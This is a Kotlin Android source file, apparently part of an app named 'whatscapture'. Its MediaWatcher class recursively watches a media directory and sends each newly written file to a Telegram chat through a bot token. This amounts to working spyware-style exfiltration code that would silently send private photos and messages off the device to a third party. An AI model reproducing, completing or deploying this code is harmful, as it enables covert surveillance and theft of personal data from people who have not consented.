package com.whatscapture

import android.os.FileObserver
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class MediaWatcher(
    private val dirPath: String,
    private val token: String,
    private val chatId: String
) {
    private val observers = mutableMapOf<String, FileObserver>()
    private val scope = CoroutineScope(Dispatchers.IO)

    fun startWatching() {
        val dir = File(dirPath)
        if (!dir.exists() || !dir.isDirectory) {
            Log.w(TAG, "Directorio no existe: $dirPath")
            return
        }
        watchRecursively(dir)
        Log.d(TAG, "Observando recursivo: $dirPath")
    }

    fun stopWatching() {
        synchronized(observers) {
            observers.values.forEach { it.stopWatching() }
            observers.clear()
        }
    }

    private fun watchRecursively(directory: File) {
        if (!directory.exists() || !directory.isDirectory) return
        addObserverForDirectory(directory)
        directory.listFiles()?.forEach { child ->
            if (child.isDirectory) {
                watchRecursively(child)
            }
        }
    }

    private fun addObserverForDirectory(directory: File) {
        val absolutePath = directory.absolutePath

        synchronized(observers) {
            if (observers.containsKey(absolutePath)) return
        }

        val observer = object : FileObserver(absolutePath, CREATE or MOVED_TO or CLOSE_WRITE) {
            override fun onEvent(event: Int, path: String?) {
                if (path == null) return
                if (event and (CREATE or MOVED_TO or CLOSE_WRITE) == 0) return

                val fullPath = "$absolutePath/$path"
                val file = File(fullPath)

                if (file.isDirectory) {
                    if (event and (CREATE or MOVED_TO) != 0) {
                        watchRecursively(file)
                    }
                    return
                }

                if (file.name.startsWith(".")) return
                if (file.name.startsWith("nomedia")) return

                scope.launch {
                    if (waitUntilFileIsStable(file)) {
                        TelegramSender.sendFile(
                            token = token,
                            chatId = chatId,
                            filePath = fullPath,
                            fileName = file.name
                        )
                        Log.d(TAG, "Enviado: ${file.name} (${file.length()} bytes)")
                    }
                }
            }
        }

        observer.startWatching()
        synchronized(observers) {
            observers[absolutePath] = observer
        }
    }

    private suspend fun waitUntilFileIsStable(file: File): Boolean {
        var previousSize = -1L

        repeat(6) {
            if (!file.exists()) {
                delay(200)
                return@repeat
            }

            val currentSize = file.length()
            if (currentSize > 0L && currentSize == previousSize) {
                return true
            }

            previousSize = currentSize
            delay(200)
        }

        return file.exists() && file.length() > 0L
    }

    companion object {
        private const val TAG = "MediaWatcher"
    }
}
